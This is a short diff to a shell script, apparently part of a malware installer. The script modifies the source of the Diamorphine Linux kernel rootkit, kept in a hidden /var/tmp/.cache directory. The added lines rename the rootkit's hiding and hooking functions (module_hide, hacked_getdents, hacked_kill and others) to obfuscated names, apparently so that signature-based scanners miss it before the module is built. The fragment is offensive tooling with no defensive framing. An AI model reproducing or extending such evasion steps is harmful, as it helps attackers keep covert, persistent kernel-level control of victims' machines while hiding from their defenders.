@@ -26,6 +26,11 @@ modify_rk(){
 	sed -i 's/diamorphine_init/rk_init/g' /var/tmp/.cache/rk.c
 	sed -i 's/diamorphine_cleanup/rk_cleanup/g' /var/tmp/.cache/rk.c
 	sed -i 's/diamorphine.o/rk.o/g' /var/tmp/.cache/Makefile
+	sed -i 's/module_hide/module_h1dd3/g' /var/tmp/.cache/rk.c
+	sed -i 's/module_hidden/module_h1dd3n/g' /var/tmp/.cache/rk.c
+	sed -i 's/is_invisible/e_invisible/g' /var/tmp/.cache/rk.c
+	sed -i 's/hacked_getdents/hack_getdents/g' /var/tmp/.cache/rk.c
+	sed -i 's/hacked_kill/h4ck_kill/g' /var/tmp/.cache/rk.c
 }
 
 make_rk(){
